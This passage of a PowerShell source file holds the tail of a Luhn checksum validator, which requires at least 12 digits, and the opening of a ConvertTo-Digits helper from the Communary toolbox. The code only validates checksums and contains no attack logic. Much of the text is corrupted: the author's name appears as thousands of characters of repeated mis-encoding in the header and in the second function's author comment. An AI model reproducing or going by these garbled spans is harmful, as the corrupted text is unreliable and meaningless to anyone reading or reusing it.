ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¹ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
            Date: 19.02.2016
            Version: 1.0
            Dependencies: Get-LuhnCheckSum, ConvertTo-Digits
            .LINKS
            https://en.wikipedia.org/wiki/Luhn_algorithm
            https://communary.wordpress.com/
            https://github.com/gravejester/Communary.ToolBox
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeline = $true)]
        [uint64]$Number
    )

    $numberDigits = ConvertTo-Digits -Number $Number
    $checksumDigit = $numberDigits[-1]
    $numberWithoutChecksumDigit = $numberDigits[0..($numberDigits.Count - 2)] -join ''
    $checksum = Get-LuhnCheckSum -Number $numberWithoutChecksumDigit
    $NumCount = ([string]$numberWithoutChecksumDigit).Length

    if ((($checksum + $checksumDigit) % 10) -eq 0 -and $NumCount -ge 12)
    {
        Write-Output -InputObject $true
    }
    else
    {
        Write-Output -InputObject $false
    }
}


# -------------------------------------------
# Function: ConvertTo-Digits
# -------------------------------------------
# Author: ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¹ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Â ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“YVIND KALLSTAD
# Source: https://communary.net/2016/02/19/the-luhn-algorithm/
function ConvertTo-Digits
{
    <#
            .SYNOPSIS
            Convert an integer into an array of bytes of its individual digits.
            .DESCRIPTION
            Convert an integer into an array of bytes of its individual digits.
            .EXAMPLE
            ConvertTo-Digits 145
            .INPUTS
            System.UInt64
            .LINK
            https://communary.wordpress.com/
            https://github.com/gravejester/Communary.ToolBox
            .NOTES
